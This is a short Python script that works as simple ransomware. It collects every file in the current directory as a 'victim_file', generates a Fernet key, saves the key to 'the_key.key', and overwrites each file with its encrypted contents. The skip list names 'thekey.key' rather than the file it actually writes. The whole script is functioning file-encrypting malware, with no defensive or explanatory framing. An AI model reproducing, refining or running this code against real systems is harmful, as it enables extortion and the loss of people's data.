import os
from cryptography.fernet import Fernet

#file list container
victim_file = []

for file in os.listdir():
    if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        victim_file.append(file)

print(victim_file)

key = Fernet.generate_key()
print(key)

with open("the_key.key", "wb") as thekey:
    thekey.write(key)

for file in victim_file:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    encrypt_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(encrypt_contents)